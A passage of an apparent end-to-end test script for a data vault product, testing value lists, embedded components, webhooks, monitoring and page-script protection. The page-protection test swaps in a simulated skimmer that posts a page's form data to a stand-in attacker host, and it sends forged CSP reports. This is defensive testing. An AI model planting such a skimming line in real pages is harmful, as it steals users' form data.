  form.append("file", new Blob([csvRows.join("\n")], { type: "text/csv" }), "vip.csv");
  const upStart = Date.now();
  const up = await fetch(`${BASE}/control/v1/vaults/${V}/custom-entities/${vipE.json.id}/values`, { method: "POST", headers: { authorization: `Bearer ${ADMIN}` }, body: form });
  const upBody = await up.json();
  const upMs = Date.now() - upStart;
  console.log(`        100,000-row upload: ${upMs} ms, ${JSON.stringify({ ...upBody, rejected_rows: undefined })}`);
  check("criterion 5: 100,000 rows upload in under 60 seconds", up.status === 200 && upBody.received === 99999 && upMs < 60000, JSON.stringify(upBody));
  check("an upload reports duplicates and rejected rows, without their contents", upBody.duplicates === 1 && upBody.rejected === 2 && upBody.rejected_rows.some((r) => r.reason === "empty") && upBody.rejected_rows.some((r) => r.reason.includes("200")) && !JSON.stringify(upBody).includes(VIP));
  const tooBig = new FormData();
  tooBig.append("file", new Blob([Array.from({ length: 100001 }, (_, i) => `v${i}`).join("\n")], { type: "text/csv" }), "big.csv");
  const big = await fetch(`${BASE}/control/v1/vaults/${V}/custom-entities/${vipE.json.id}/values`, { method: "POST", headers: { authorization: `Bearer ${ADMIN}` }, body: tooBig });
  check("over the per-list limit gets 413 value_list_too_large", big.status === 413 && (await big.json()).error.code === "value_list_too_large");
  sink.length = 0;
  await req(`/logs/http/${pipe.json.id}`, { body: [{ msg: `call ${VIP} today` }], headers: { "x-rv-pipeline-key": pipe.json.ingest_key } });
  check("an uploaded list stays out of traffic before approval", sink.at(-1)?.body.includes(VIP), sink.at(-1)?.body);
  const vipReq = await ce(`/${vipE.json.id}/publish-requests`, { token: ADMIN, body: {} });
  check("a list entity passes its tests and benchmark", vipReq.status === 201, vipReq.text);
  console.log(`        list benchmark: ${JSON.stringify(vipReq.json.benchmark)}`);
  await control(`/v1/publish-requests/${vipReq.json.id}/approve`, { token: BOLA, method: "POST" });
  await ce(`/${vipE.json.id}/status`, { token: ADMIN, body: { status: "enforcing" } });
  await sleep(11000);
  const vipOut = await viaModules(`call ${VIP} today`);
  check("a value list redacts in all four modules", Object.values(vipOut).every((v) => !v.includes(VIP)), JSON.stringify(vipOut));
  check("the database holds hashes, not list values", !sh(`${COMPOSE} exec -T postgres pg_dump -U rv rv`).includes(VIP));

  // Criterion 10.
  const refPolicy = await control("/v1/policies", { token: ADMIN, body: { name: "loan-access", source: { rules: [{ id: "r", actions: ["detokenize"], who: { roles: ["engineer"] }, what: { data_types: ["c_loan_id"] }, when: {}, returns: "masked" }] } } });
  check("a policy can target a custom entity", refPolicy.status === 200, refPolicy.text);
  check("that policy publishes", (await control(`/v1/policies/${refPolicy.json.id}/publish`, { token: BOLA, method: "POST" })).status === 200);
  const blocked = await ce(`/${LID}/status`, { token: ADMIN, body: { status: "archived" } });
  check("criterion 10: archiving a referenced entity is blocked, listing the policies", blocked.status === 409 && blocked.json.error.policies?.some((p) => p.name === "loan-access"), blocked.text);
  await control(`/v1/policies/${refPolicy.json.id}/archive`, { token: ADMIN, method: "POST" });
  check("archiving works once no policy needs it", (await ce(`/${LID}/status`, { token: ADMIN, body: { status: "archived" } })).json?.status === "archived");
  await sleep(11000);
  const after = await viaModules(`repayment on ${LOAN}`);
  check("an archived entity detects nothing, and its counts remain", after.logs.includes(LOAN) && (await ce(`/${LID}/stats`, { token: ADMIN })).json.rows.length > 0);
  check("a new token cannot be issued for an archived entity", (await req(`/v1/vaults/${V}/tokenize`, { token: await sdk.bearer(), body: { items: [{ field: "c_loan_id", value: LOAN }], continue_on_error: true } })).json?.results?.[0]?.error?.code === "validation_failed");

  // Criterion 8.
  await sleep(6000); // counters flush
  const stamped = sh(`${COMPOSE} exec -T postgres psql -U rv rv -At -c "SELECT count(*) FILTER (WHERE entity_version IS NULL), count(*) FILTER (WHERE ruleset_version IS NULL), count(*), count(*) FILTER (WHERE action='shadow') FROM events.detection_events WHERE entity_type LIKE 'c\\_%'"`).trim().split("|").map(Number);
  check("criterion 8: every custom count carries entity_version and ruleset_version", stamped[2] > 0 && stamped[0] === 0 && stamped[1] === 0, stamped.join());
  check("shadow counts are recorded as shadow", stamped[3] > 0, stamped.join());
  const fromDay = new Date(Date.now() - 86400_000).toISOString(), toDay = new Date(Date.now() + 60_000).toISOString();
  const rep = await control(`/v1/reports/residency?from=${encodeURIComponent(fromDay)}&to=${encodeURIComponent(toDay)}`, { token: ADMIN });
  const reg = rep.json?.report?.custom_entities ?? rep.json?.custom_entities ?? [];
  check("criterion 8: the report lists each custom entity, its versions and approvers", reg.find((e) => e.slug === "c_loan_id")?.versions?.length === 2 && reg.every((e) => e.versions.every((v) => v.approved_by !== v.published_by)) && reg.find((e) => e.slug === "c_loan_id")?.shadow_hits_in_period > 0, rep.text.slice(0, 400));
  const evList = await control("/v1/audit-events?limit=200", { token: ADMIN });
  const actions = new Set(evList.json.events.map((e) => e.action));
  check("publish, status change and upload are audited", ["custom_entity_publish", "custom_entity_status_change", "value_list_upload"].every((x) => actions.has(x)), [...actions].join());
  check("no list value or sample reached the audit log", !evList.text.includes(VIP) && !evList.text.includes(SAMPLE_SECRET));
  const listing = await ce("?sort=hits", { token: ADMIN });
  check("the table lists entities with hits and modules", listing.json?.entities?.some((e) => e.slug === "c_vip" && e.hits_7d > 0) && listing.json.entities.length >= 5, listing.text.slice(0, 200));
  check("templates say their formats are unconfirmed", (await control("/v1/custom-entity-templates", { token: ADMIN })).json.templates.every((t) => t.confirmed === false));
  const sug = await control("/v1/custom-entities/suggest-pattern", { token: ADMIN, body: { examples: ["LN-00412873", "LN-11112222", "LN-99998888"] } });
  check("Build from examples proposes a pattern", sug.json?.regex === "LN\\-\\d{8}", sug.text);
  sinkSrv.close();
}

section("Secure components");
const EMBED_VALUE = "22555566671";
let c2Token = "";
{
  const ORIGIN = "https://app.e2e.example.ng";
  const sa = await sdk.bearer();
  const mint = (body, token = sa) => req(`/v1/vaults/${V}/client-tokens`, { token, body });
  const em = (path, body, headers = {}) => req(`/embed/v1/${path}`, { body, headers });
  check("components are off until a site is listed", (await mint({ kind: "collect", origin: ORIGIN, fields: ["bvn"] })).json?.error?.code === "origin_not_allowed");
  check("a wildcard or path is refused as a site", (await control(`/v1/vaults/${V}/embed`, { token: ADMIN, method: "PATCH", body: { origins: ["https://*.example.ng"] } })).status === 400 && (await control(`/v1/vaults/${V}/embed`, { token: ADMIN, method: "PATCH", body: { origins: ["https://a.ng/path"] } })).status === 400);
  check("plain http is refused on a production vault", (await control(`/v1/vaults/${V}/embed`, { token: ADMIN, method: "PATCH", body: { origins: ["http://localhost:3000"] } })).status === 400);
  check("a support agent cannot list a site", (await control(`/v1/vaults/${V}/embed`, { token: sade.token, method: "PATCH", body: { origins: [ORIGIN] } })).status === 403);
  check("an admin lists a site", (await control(`/v1/vaults/${V}/embed`, { token: ADMIN, method: "PATCH", body: { origins: [ORIGIN] } })).status === 200);
  await sleep(6000);
  const frame = await fetch(`${BASE}/embed/frame/${V}`);
  const csp = frame.headers.get("content-security-policy") ?? "";
  check("the frame loads through the edge, framed only by the listed site", frame.status === 200 && csp.includes(`frame-ancestors ${ORIGIN}`) && !csp.includes("unsafe"), csp);
  const rvjs = await fetch(`${BASE}/embed/rv.js`);
  check("the loader script is served from the install", rvjs.status === 200 && rvjs.headers.get("content-type").includes("javascript") && (await rvjs.text()).includes("Onshore"));
  check("the frame's own script is not loadable by other sites", (await fetch(`${BASE}/embed/frame.js`)).headers.get("cross-origin-resource-policy") === "same-origin");
  const c1 = await mint({ kind: "collect", origin: ORIGIN, fields: ["bvn"], subject_ref: "cust_embed_1" });
  check("a collect token is minted", c1.json?.client_token?.startsWith("rvct_"), c1.text);
  const body = (value) => ({ client_token: c1.json.client_token, parent_origin: ORIGIN, values: { bvn: value } });
  const typo = await em("collect", body("nope"));
  check("a typo is refused without echoing it, and keeps the token", typo.status === 422 && !typo.text.includes("nope"), typo.text);
  check("a cross-site page cannot redeem", (await em("collect", body(EMBED_VALUE), { "sec-fetch-site": "cross-site" })).status === 403);
  check("a foreign Origin cannot redeem", (await em("collect", body(EMBED_VALUE), { origin: "https://evil.example" })).status === 403);
  check("the wrong page cannot redeem", (await em("collect", { ...body(EMBED_VALUE), parent_origin: "https://evil.example" })).json?.error?.code === "invalid_client_token");
  const c2 = await em("collect", body(EMBED_VALUE));
  check("collect returns a token and not the value", c2.status === 200 && c2.json.tokens.bvn.startsWith("tok_bvn_") && !c2.text.includes(EMBED_VALUE), c2.text);
  check("a client token works only once", (await em("collect", body(EMBED_VALUE))).status === 401);
  c2Token = c2.json.tokens.bvn;
  const lookup = await sdk.lookup(V, "bvn", EMBED_VALUE);
  check("the value really is in the vault", lookup === c2.json.tokens.bvn, lookup);
  check("a client token is not a bearer token", (await req(`/v1/vaults/${V}/detokenize`, { token: c1.json.client_token, body: { items: [{ token: c2.json.tokens.bvn }], purpose: "x" } })).status === 401);
  const r1 = await mint({ kind: "reveal", origin: ORIGIN, tokens: [c2.json.tokens.bvn], purpose: `support ticket ${EMBED_VALUE}`, on_behalf_of: "agent ada" });
  const rev = await em("reveal", { client_token: r1.json?.client_token, parent_origin: ORIGIN });
  check("reveal follows policy: the backend's default deny still applies", rev.status === 200 && rev.json.results[0].error?.code === "policy_denied" && !rev.text.includes(EMBED_VALUE), rev.text);
  const events = await control("/v1/audit-events?action=client_token_mint&limit=20", { token: ADMIN });
  check("minting is audited, and a value in a purpose is removed", events.json.events.length >= 2 && !events.text.includes(EMBED_VALUE), events.text.slice(0, 300));
  const embedded = await control("/v1/audit-events?limit=100", { token: ADMIN });
  check("what a component does is audited as the embed module", embedded.json.events.some((e) => e.module === "embed" && e.action === "tokenize"));
  await control(`/v1/vaults/${V}/embed`, { token: ADMIN, method: "PATCH", body: { origins: [] } });
}

section("Outbound webhooks and monitoring");
let WEBHOOK_SECRET = "";
{
  const http = await import("node:http");
  const { verifyWebhook } = await import(process.env.RV_E2E_SDK);
  const got = [];
  let answer = () => [200];
  const rx = http.createServer((q, s) => { const c = []; q.on("data", (d) => c.push(d)); q.on("end", () => { const body = Buffer.concat(c).toString(); got.push({ url: q.url, headers: q.headers, body, json: JSON.parse(body || "{}") }); const [code, hdr] = answer(q); s.writeHead(code, hdr ?? {}); s.end("BVN 22333444558 secret receiver text"); }); });
  await new Promise((r) => rx.listen(18996, "0.0.0.0", r));
  const until = async (fn, seconds = 30) => { for (let i = 0; i < seconds * 4; i++) { const v = fn(); if (v) return v; await sleep(250); } return undefined; };
  const untilAsync = async (fn, seconds = 30) => { for (let i = 0; i < seconds * 2; i++) { const v = await fn(); if (v) return v; await sleep(500); } return undefined; };
  const ALL = (await control("/v1/webhooks/event-types", { token: ADMIN })).json.event_types.map((t) => t.type);
  check("the event catalogue leaves out high-volume actions", ALL.includes("reveal.denied") && !ALL.some((t) => t.startsWith("tokenize")));
  const URL_ = "http://host.docker.internal:18996/hook?receiver_key=keep-me-quiet";
  check("a support agent cannot create a webhook", (await control("/v1/webhooks", { token: sade.token, body: { url: URL_, event_types: ALL } })).status === 403);
  check("an unknown event type is refused", (await control("/v1/webhooks", { token: ADMIN, body: { url: URL_, event_types: ["nope"] } })).status === 400);
  check("credentials in the URL are refused", (await control("/v1/webhooks", { token: ADMIN, body: { url: "http://user:pw@host.docker.internal:18996/", event_types: ALL } })).status === 400);
  const made = await control("/v1/webhooks", { token: ADMIN, body: { url: URL_, description: "e2e", event_types: ALL } });
  check("an admin creates a webhook, and gets the secret once", made.status === 201 && made.json.secret?.startsWith("rvwh_"), made.text);
  const W = made.json.id; WEBHOOK_SECRET = made.json.secret;
  const list = await control("/v1/webhooks", { token: ADMIN });
  check("the secret is never listed", list.status === 200 && !list.text.includes(WEBHOOK_SECRET) && !list.text.includes("secret_enc"));
  const auditText = (await control("/v1/audit-events?action=webhook_create&limit=5", { token: ADMIN })).text;
  check("creating one is audited, without the receiver's own key", auditText.includes("webhook_create") && !auditText.includes("keep-me-quiet"), auditText.slice(0, 200));

  await control(`/v1/webhooks/${W}/test`, { token: ADMIN, method: "POST" });
  const ping = await until(() => got.find((g) => g.json.type === "test.ping"));
  check("a test event arrives", Boolean(ping));
  check("it is signed, and the SDK accepts it", ping && verifyWebhook(WEBHOOK_SECRET, ping.body, ping.headers["x-rv-signature"]), ping?.headers["x-rv-signature"]);
  check("a changed body fails the check", ping && !verifyWebhook(WEBHOOK_SECRET, ping.body + " ", ping.headers["x-rv-signature"]));
  check("the wrong secret fails the check", ping && !verifyWebhook("rvwh_other", ping.body, ping.headers["x-rv-signature"]));
  check("an old signature fails the check", ping && !verifyWebhook(WEBHOOK_SECRET, ping.body, ping.headers["x-rv-signature"], { now: Math.floor(Date.now() / 1000) + 3600 }));
  const py = sh(`RV_SIG='${ping?.headers["x-rv-signature"]}' RV_SEC='${WEBHOOK_SECRET}' RV_BODY='${ping?.body.replace(/'/g, "")}' PYTHONPATH=${process.env.RV_E2E_PY} python3 -c "
import os,importlib.util as u
s=open(os.environ['PYTHONPATH']+'/onshore/__init__.py').read()
i=s.index('def verify_webhook'); j=s.index('class VaultError')
ns={}; exec('import hashlib,hmac,time\\nfrom typing import Optional\\n'+s[i:j],ns)
b=os.environ['RV_BODY'].encode()
print(ns['verify_webhook'](os.environ['RV_SEC'],b,os.environ['RV_SIG']), ns['verify_webhook']('x',b,os.environ['RV_SIG']), ns['verify_webhook'](os.environ['RV_SEC'],b+b' ',os.environ['RV_SIG']))"`).trim();
  check("the Python helper agrees", py === "True False False", py);

  // A real event, with values in everything that could carry one.
  got.length = 0;
  const denied = await sdk.detokenize(V, [c2Token], `ticket ${EMBED_VALUE} for ada@example.ng`, { continueOnError: true }).catch((e) => e);
  const ev = await until(() => got.find((g) => g.json.type === "reveal.denied"));
  check("a denied reveal reaches the webhook", Boolean(ev), JSON.stringify(denied).slice(0, 200));
  check("the event names who and what, and no value, purpose or address", ev && ev.json.data.principal_id && ev.json.data.action === "reveal_denied" && !ev.body.includes(EMBED_VALUE) && !ev.body.includes("ada@example.ng") && !("purpose" in ev.json.data) && !("source_ip" in ev.json.data) && !("token_hash" in ev.json.data), ev?.body);

  // Failure, retry and history.
  got.length = 0;
  answer = () => [500];
  const failing = await control(`/v1/webhooks/${W}/test`, { token: ADMIN, method: "POST" });
  await until(() => got.find((g) => g.json.id === failing.json.event_id));
  const afterFail = await untilAsync(async () => (await control(`/v1/webhooks/${W}/deliveries?limit=20`, { token: ADMIN })).json.deliveries.find((d) => d.event_id === failing.json.event_id && d.attempts === 1));
  check("a failure is recorded with its code, and not the receiver's words", afterFail?.status === "pending" && afterFail.last_error === "answered 500" && !JSON.stringify(afterFail).includes("receiver text"), JSON.stringify(afterFail));
  answer = () => [200];
  const retried = await until(() => got.filter((g) => g.json.id === failing.json.event_id).length >= 2 ? got.filter((g) => g.json.id === failing.json.event_id) : null, 50);
  check("it retries with the same event id, and counts the attempt", retried?.[1]?.headers["x-rv-delivery-attempt"] === "2", JSON.stringify(retried?.map((r) => r.headers["x-rv-delivery-attempt"])));
  const healed = await untilAsync(async () => (await control(`/v1/webhooks/${W}/deliveries?limit=20`, { token: ADMIN })).json.deliveries.find((d) => d.event_id === failing.json.event_id && d.status === "delivered"));
  check("the retry is recorded as delivered", Boolean(healed));
  const re = await control(`/v1/webhooks/${W}/deliveries/${healed?.id}/redeliver`, { token: ADMIN, method: "POST" });
  const again = await until(() => got.filter((g) => g.json.id === failing.json.event_id).length >= 3);
  check("a delivery can be sent again, with the same id", re.status === 200 && Boolean(again));

  // A redirect must not carry the event anywhere.
  got.length = 0;
  answer = (q) => (q.url.startsWith("/elsewhere") ? [200] : [302, { location: "http://host.docker.internal:18996/elsewhere" }]);
  const red = await control(`/v1/webhooks/${W}/test`, { token: ADMIN, method: "POST" });
  await until(() => got.find((g) => g.json.id === red.json.event_id));
  await sleep(1500);
  check("a redirect is not followed", !got.some((g) => g.url.startsWith("/elsewhere")));
  const redRow = await untilAsync(async () => (await control(`/v1/webhooks/${W}/deliveries?limit=20`, { token: ADMIN })).json.deliveries.find((d) => d.event_id === red.json.event_id && d.attempts >= 1));
  check("and it counts as a failure", redRow?.status === "pending" && /redirects are not followed/.test(redRow.last_error ?? ""), JSON.stringify(redRow));
  answer = () => [200];

  // Rotation has no gap.
  const rot = await control(`/v1/webhooks/${W}/rotate-secret`, { token: ADMIN, method: "POST" });
  got.length = 0;
  await control(`/v1/webhooks/${W}/test`, { token: ADMIN, method: "POST" });
  const rotated = await until(() => got.find((g) => g.json.type === "test.ping"));
  check("after rotation, both the old and the new secret verify", rotated && verifyWebhook(WEBHOOK_SECRET, rotated.body, rotated.headers["x-rv-signature"]) && verifyWebhook(rot.json.secret, rotated.body, rotated.headers["x-rv-signature"]), rotated?.headers["x-rv-signature"]);

  // A dead receiver is turned off, and someone is told.
  sh(`${COMPOSE} exec -T postgres psql -U rv rv -c "UPDATE control.webhook_endpoints SET consecutive_failures=99 WHERE id='${W}'"`);
  answer = () => [503];
  await control(`/v1/webhooks/${W}/test`, { token: ADMIN, method: "POST" });
  const off = await untilAsync(async () => (await control("/v1/webhooks", { token: ADMIN })).json.endpoints.find((e) => e.id === W && !e.enabled));
  check("repeated failure turns the endpoint off, and says why", /failures in a row/.test(off?.disabled_reason ?? ""), JSON.stringify(off));
  check("and raises an alert", (await control("/v1/alerts", { token: ADMIN })).json.alerts.some((a) => a.kind === "webhook_disabled"));
  answer = () => [200];
  const on = await control(`/v1/webhooks/${W}`, { token: ADMIN, method: "PATCH", body: { enabled: true } });
  check("turning it back on clears the count", on.json.enabled === true && on.json.consecutive_failures === 0 && on.json.disabled_reason === null, on.text);

  // Monitoring.
  const mon = await untilAsync(async () => { const r = await control("/v1/monitoring", { token: ADMIN }); return r.json.components?.length >= 7 && r.json.components.every((c) => c.status === "up") ? r.json : null; }, 45);
  check("every service reports up", Boolean(mon), JSON.stringify((await control("/v1/monitoring", { token: ADMIN })).json.components?.map((c) => `${c.component}:${c.status}`)));
  check("a support agent cannot read monitoring", (await control("/v1/monitoring", { token: sade.token })).status === 403);
  got.length = 0;
  sh(`${COMPOSE} stop file-redactor`);
  const downEv = await until(() => got.find((g) => g.json.type === "monitor.component_down" && g.json.data.component === "file-redactor"), 40);
  check("a stopped service sends one down event", Boolean(downEv));
  check("the console API reports it down", (await control("/v1/monitoring", { token: ADMIN })).json.components.find((c) => c.component === "file-redactor")?.status === "down");
  sh(`${COMPOSE} start file-redactor`);
  const upEv = await until(() => got.find((g) => g.json.type === "monitor.component_recovered" && g.json.data.component === "file-redactor"), 60);
  check("its return sends one recovered event", Boolean(upEv));
  check("neither was repeated", got.filter((g) => g.json.type === "monitor.component_down").length === 1 && got.filter((g) => g.json.type === "monitor.component_recovered").length === 1, got.map((g) => g.json.type).join());

  // Metrics.
  const scrape = (t) => fetch(`${BASE}/control/v1/monitoring/metrics`, { headers: t ? { authorization: `Bearer ${t}` } : {} });
  check("metrics refuse no key", (await scrape()).status === 401);
  check("metrics refuse a session token", (await scrape(ADMIN)).status === 401);
  const mk = await control("/v1/monitoring/metrics-key", { token: ADMIN, method: "POST" });
  const sc = await scrape(mk.json.key);
  const scText = await sc.text();
  check("metrics answer in Prometheus format with the key", sc.status === 200 && sc.headers.get("content-type").includes("version=0.0.4") && scText.includes('rv_component_up{component="vault-api"} 1') && scText.includes("rv_audit_events_last_hour"), scText.slice(0, 300));
  check("the metrics key does nothing else", (await control("/v1/monitoring", { token: mk.json.key })).status === 401 && (await req(`/v1/vaults/${V}/tokenize`, { token: mk.json.key, body: { items: [] } })).status === 401);
  check("metrics hold no value", !scText.includes(EMBED_VALUE) && !scText.includes(BVN));
  await control("/v1/monitoring/metrics-key", { token: ADMIN, method: "DELETE" });
  check("a revoked metrics key stops working", (await scrape(mk.json.key)).status === 401);

  const del = await control(`/v1/webhooks/${W}`, { token: ADMIN, method: "DELETE" });
  check("a webhook can be deleted", del.status === 200 && (await control(`/v1/webhooks/${W}/deliveries`, { token: ADMIN })).status === 404);
  rx.close();
}

section("Page protection");
{
  const http = await import("node:http");
  let cdn = "console.log('good')";
  let pageHtml = `<!doctype html><title>KYC</title><script src="/app.js"></script><script src="http://host.docker.internal:18997/vendor.js?session=22888899911"></script>`;
  const site = http.createServer((q, s) => { const p = q.url.split("?")[0]; s.writeHead(p.endsWith(".js") ? 200 : 200, { "content-type": p.endsWith(".js") ? "text/javascript" : "text/html" }); s.end(p.endsWith(".js") ? cdn : pageHtml); });
  await new Promise((r) => site.listen(18997, "0.0.0.0", r));
  const PAGE_ORIGIN = "http://host.docker.internal:18997";
  const VENDOR = `${PAGE_ORIGIN}/vendor.js`;
  const hookRx = []; 
  const rx = http.createServer((q, s) => { const c = []; q.on("data", (d) => c.push(d)); q.on("end", () => { hookRx.push(JSON.parse(Buffer.concat(c).toString() || "{}")); s.writeHead(200); s.end(); }); });
  await new Promise((r) => rx.listen(18998, "0.0.0.0", r));
  const hook = await control("/v1/webhooks", { token: ADMIN, body: { url: "http://host.docker.internal:18998/", event_types: ["page.script_new", "page.script_changed", "page.script_rejected_seen"] } });
  const until = async (fn, seconds = 30) => { for (let i = 0; i < seconds * 4; i++) { const v = await fn(); if (v) return v; await sleep(250); } return undefined; };

  check("a support agent cannot protect a page", (await control("/v1/page-protection/pages", { token: sade.token, body: { name: "KYC", page_url: `${PAGE_ORIGIN}/kyc` } })).status === 403);
  const made = await control("/v1/page-protection/pages", { token: ADMIN, body: { name: "KYC", page_url: `${PAGE_ORIGIN}/kyc?ref=22888899911` } });
  check("an admin protects a page, and its address keeps no query", made.status === 201 && made.json.report_key?.startsWith("rvp_") && !made.text.includes("22888899911"), made.text);
  const P = made.json.id, KEY = made.json.report_key;
  const REPORT = `${BASE}/control/v1/page-protection/report/${KEY}`;
  const report = (body, headers = {}) => fetch(REPORT, { method: "POST", headers: { "content-type": "application/csp-report", ...headers }, body: typeof body === "string" ? body : JSON.stringify(body) });
  const scriptsNow = async () => (await control(`/v1/page-protection/pages/${P}`, { token: ADMIN })).json.scripts;

  const scan = await control(`/v1/page-protection/pages/${P}/scan`, { token: ADMIN, method: "POST" });
  const found = await scriptsNow();
  check("a scan lists what the page's HTML loads", scan.status === 200 && found.some((s) => s.script_url === `${PAGE_ORIGIN}/app.js`) && found.some((s) => s.script_url === VENDOR), JSON.stringify(found.map((s) => s.script_url)));
  check("the query string on a script is not kept", !JSON.stringify(found).includes("22888899911"));
  check("everything starts pending", found.every((s) => s.status === "pending"));
  const newEvent = await until(() => hookRx.find((h) => h.type === "page.script_new" && h.data.script_url === VENDOR));
  check("a new script sends an event", Boolean(newEvent));
  check("and raises an alert", (await control("/v1/alerts", { token: ADMIN })).json.alerts.some((a) => a.kind === "page_script_new"));

  const EVIL = "https://skimmer.pentest.invalid/x.js";
  const r1 = await report({ "csp-report": { "document-uri": `${PAGE_ORIGIN}/kyc?bvn=22888899911`, "blocked-uri": `${EVIL}?card=4111111111111111`, "effective-directive": "script-src-elem" } });
  check("a browser's CSP report is accepted, and answers nothing", r1.status === 204 && (await r1.text()) === "");
  const seenEvil = (await scriptsNow()).find((s) => s.script_url === EVIL);
  check("it adds the script as pending, without its query", seenEvil?.status === "pending" && seenEvil.source === "csp", JSON.stringify(seenEvil));
  await report([{ type: "csp-violation", body: { documentURL: `${PAGE_ORIGIN}/kyc`, blockedURL: "inline", effectiveDirective: "script-src-elem" } }], { "content-type": "application/reports+json" });
  check("the Reporting API format works too, and inline code is noted", (await scriptsNow()).some((s) => s.script_url === "inline"));
  await fetch(REPORT, { method: "POST", headers: { "content-type": "text/plain" }, body: JSON.stringify({ page: PAGE_ORIGIN, scripts: [`${PAGE_ORIGIN}/late.js`] }) });
  check("the watcher's format works", (await scriptsNow()).some((s) => s.script_url === `${PAGE_ORIGIN}/late.js` && s.source === "watcher"));

  const before = (await scriptsNow()).length;
  await report({ "csp-report": { "document-uri": "https://other.example/x", "blocked-uri": "https://other.example/forged1.js", "effective-directive": "script-src" } });
  await report({ "csp-report": { "document-uri": `${PAGE_ORIGIN}/kyc`, "blocked-uri": "https://other.example/forged2.js", "effective-directive": "script-src" } }, { origin: "https://other.example" });
  await report({ "csp-report": { "document-uri": `${PAGE_ORIGIN}/kyc`, "blocked-uri": "javascript:alert(1)", "effective-directive": "script-src" } });
  await report("not json");
  await fetch(`${BASE}/control/v1/page-protection/report/rvp_nosuchkeyatall_000000000`, { method: "POST", body: "{}" });
  check("reports from elsewhere, odd schemes, junk and unknown keys add nothing", (await scriptsNow()).length === before);
  check("a report can never approve anything", (await scriptsNow()).every((s) => s.status === "pending"));
  check("the report body is limited", (await fetch(REPORT, { method: "POST", headers: { "content-type": "text/plain" }, body: "x".repeat(70000) })).status === 413);

  const vendorRow = (await scriptsNow()).find((s) => s.script_url === VENDOR);
  const decide = (id, body, token = ADMIN) => control(`/v1/page-protection/pages/${P}/scripts/${id}/decision`, { token, body });
  check("approval needs a reason", (await decide(vendorRow.id, { decision: "approve", justification: "" })).status === 400);
  check("a support agent cannot approve", (await decide(vendorRow.id, { decision: "approve", justification: "looks fine" }, sade.token)).status === 403);
  const ok = await decide(vendorRow.id, { decision: "approve", justification: `Vendor approved, ticket ${EMBED_VALUE}` });
  check("an admin approves, and the file's hash is the baseline", ok.status === 200 && ok.json.status === "approved" && /^[0-9a-f]{64}$/.test(ok.json.content_hash), ok.text);
  check("a number in the reason is removed", !ok.text.includes(EMBED_VALUE), ok.text);
  check("the decision is audited", (await control("/v1/audit-events?action=page_script_decision&limit=5", { token: ADMIN })).text.includes("page_script_decision"));
  const unchanged = await control(`/v1/page-protection/pages/${P}/scan`, { token: ADMIN, method: "POST" });
  check("an unchanged file stays approved", unchanged.status === 200 && (await scriptsNow()).find((s) => s.id === vendorRow.id).status === "approved");
  cdn = "fetch('https://skimmer.pentest.invalid', {method:'POST', body: document.forms[0]})";
  await control(`/v1/page-protection/pages/${P}/scan`, { token: ADMIN, method: "POST" });
  const changed = (await scriptsNow()).find((s) => s.id === vendorRow.id);
  check("a changed file loses its approval", changed.status === "changed" && changed.hash_changed_at, JSON.stringify(changed));
  check("and sends an event", Boolean(await until(() => hookRx.find((h) => h.type === "page.script_changed" && h.data.script_url === VENDOR))));
  check("and raises an alert", (await control("/v1/alerts", { token: ADMIN })).json.alerts.some((a) => a.kind === "page_script_changed"));
  check("nothing from the file is stored", !JSON.stringify(changed).includes("skimmer"));

  const evilRow = (await scriptsNow()).find((s) => s.script_url === EVIL);
  check("a script is rejected with a reason", (await decide(evilRow.id, { decision: "reject", justification: "Not ours" })).json.status === "rejected");
  await sleep(61000); // reports of a known script are folded together for a minute
  await report({ "csp-report": { "document-uri": `${PAGE_ORIGIN}/kyc`, "blocked-uri": EVIL, "effective-directive": "script-src" } });
  check("a rejected script running again sends an event", Boolean(await until(() => hookRx.find((h) => h.type === "page.script_rejected_seen"))));
  const page = (await control(`/v1/page-protection/pages/${P}`, { token: ADMIN })).json;
  check("the approved list leaves out anything not approved", !page.approved_sources.includes(EVIL) && !page.approved_sources.includes(VENDOR), JSON.stringify(page.approved_sources));

  const flood = [];
  for (let i = 0; i < 60; i++) flood.push(report({ "csp-report": { "document-uri": `${PAGE_ORIGIN}/`, "blocked-uri": `https://flood.invalid/${i}.js`, "effective-directive": "script-src" } }));
  await Promise.all(flood);
  const afterFlood = (await scriptsNow()).length;
  check("made-up reports are capped per hour, and someone is told", afterFlood <= 55 && (await control("/v1/alerts", { token: ADMIN })).json.alerts.some((a) => a.kind === "page_report_flood"), String(afterFlood));

  check("deleting a page removes its list", (await control(`/v1/page-protection/pages/${P}`, { token: ADMIN, method: "DELETE" })).status === 200 && (await control(`/v1/page-protection/pages/${P}`, { token: ADMIN })).status === 404);
  await control(`/v1/webhooks/${hook.json.id}`, { token: ADMIN, method: "DELETE" });
  site.close(); rx.close();
}

section("Proxy: forms, XML, headers and files");
{
  const http = await import("node:http");
  const sent = [];
  let reply = { status: 200, type: "application/json", body: "{}", headers: {} };
  const up = http.createServer((q, s) => { const c = []; q.on("data", (d) => c.push(d)); q.on("end", () => { sent.push({ url: q.url, headers: q.headers, body: Buffer.concat(c) }); s.writeHead(reply.status, { "content-type": reply.type, ...reply.headers }); s.end(reply.body); }); });
  await new Promise((r) => up.listen(18999, "0.0.0.0", r));
  const SECRET = "22666677788", PHONE2 = "08035556666", ACCT = "0456789013";
  const mkRoute = async (name, extra) => { const r = await control("/v1/proxy-routes", { token: ADMIN, body: { vault_id: V, name, method: "POST", path_pattern: "/**", upstream_url: "http://host.docker.internal:18999", ...extra } }); return r; };
  check("a header that frames the request cannot be rewritten", (await mkRoute("bad-h", { redact_headers: [{ header: "Content-Length" }] })).status === 400 && (await mkRoute("bad-h2", { redact_headers: [{ header: "X-RV-Route-Key" }] })).status === 400);
  const A = await mkRoute("Legacy KYC", { redact_paths: [{ path: "$.bvn", field: "bvn" }, { path: "$.Envelope.Body.Check.BVN", field: "bvn" }], redact_headers: [{ header: "X-Customer-BVN", field: "bvn" }], dlp_excluded_headers: ["X-Allowed"], dlp_excluded_params: ["reference"] });
  check("a route with header rules creates", A.status === 200 && Boolean(A.json.route_key), A.text);
  const B = await mkRoute("Uploads redacted", { file_policy: "redact" });
  const C = await mkRoute("Uploads passed", { file_policy: "pass" });
  const D = await mkRoute("Off", { dlp: false });
  await sleep(6000);
  const send = (route, path, body, headers = {}) => fetch(`${BASE}/proxy/${route.json.id}${path}`, { method: "POST", headers: { "x-rv-route-key": route.json.route_key, ...headers }, body });
  const last = () => sent.at(-1);
  const FORM = "application/x-www-form-urlencoded";

  let r = await send(A, "/kyc", `bvn=${SECRET}&note=call+${PHONE2}&tier=gold`, { "content-type": FORM });
